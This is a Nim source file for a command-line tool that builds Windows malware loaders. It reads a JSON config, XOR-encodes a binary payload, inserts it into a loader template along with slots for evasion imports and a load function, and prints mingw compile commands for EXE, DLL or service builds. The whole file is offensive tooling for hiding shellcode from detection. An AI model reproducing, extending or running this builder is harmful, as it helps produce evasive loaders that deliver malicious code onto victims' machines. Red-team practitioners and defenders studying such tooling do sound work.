import os
import std/json
import std/strutils
import ../core/utils/bin2xorArr

proc main() =
    if paramCount() < 1:
        echo "args: <json config file>"
        quit(-1)

    let jsonConfig = paramStr(1)

    var config: JsonNode = nil

    if fileExists(jsonConfig):
        let jsonData = readFile(jsonConfig)
        config = parseJson(jsonData)

    let loaderTemplate = $config["loader_template"].getStr().strip()

    echo "[*] Generating a loader with XORed payload from config file..."

    if fileExists(loaderTemplate):
        var code: string = readFile($loaderTemplate)

        code = code.replace("{evade_import}", $config["evade_import"])
        code = code.replace("{load_func}", $config["load_func"])
        code = code.replace("{key}", $config["xor_key"])

        let binFile: string = $config["binfile"].getStr().strip()
        let xorKey: string = $config["xor_key"].getStr().strip()

        let payload = bin2XORArray(binFile, xorKey)

        code = code.replace("{payload}", payload)
        
        let outFile = $config["outfile"].getStr().strip()

        writeFile(outFile, code)

        if $config["type"].getStr().strip() == "DLL":
            echo """[*] compile with the following command: nim c -d:release -d:mingw -d:strip --app:lib --nomain --cpu:amd64 --passL:"-static" """ & outFile
        elif $config["type"].getStr().strip() == "SVC":
            echo """[*] compile with the following command: nim c -d:release -d:mingw -d:strip --app:console --cpu:amd64 """ & outfile
        else:
            echo "[*] Compile with the following command: nim c -d:release -d:mingw -d:strip --cpu=amd64 --app=console " & outFile
    else:
        echo "No such file " & $config["loader_template"]

when isMainModule:
    main()
